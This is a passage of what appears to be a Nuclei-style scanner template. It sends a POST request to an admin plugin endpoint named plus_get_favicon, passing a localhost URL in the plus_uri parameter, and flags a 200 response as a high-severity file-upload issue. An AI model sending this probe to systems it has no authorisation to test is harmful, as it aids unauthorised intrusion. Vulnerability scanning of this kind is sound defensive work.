  author: hacktwo
  severity: high
  description: ''
  tags: file-upload,unknown
http:
- raw:
  - 'POST /?m=Admin&c=Plus&a=plus_get_favicon HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    plus_uri=http://127.0.0.1:80&app_id=pc_client'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
